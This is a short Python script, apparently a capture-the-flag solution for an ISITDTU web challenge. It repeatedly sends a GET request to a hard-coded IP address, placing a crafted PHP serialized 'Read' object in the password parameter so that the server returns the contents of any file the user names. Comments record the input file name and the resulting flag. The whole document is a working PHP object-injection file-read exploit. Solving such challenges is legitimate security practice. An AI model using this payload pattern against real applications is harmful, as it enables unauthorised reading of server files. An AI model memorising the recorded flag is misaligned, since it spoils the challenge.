from pwn import *
import requests

while(1):
	path = input("File Nmae : ")
	if path == '0':
		break
	path_len = len(path)
	url = 'http://35.220.140.18:5000/?username=&password=O:4:"Read":1:{s:4:"flag";s:' + str(path_len) + ':"' + path  +'";}'
	res = requests.get(url).text
	log.info('FLAG : {}'.format(res))

## Input : fl4g.php
## Output : ISITDTU{4re_y0u_w4rm?}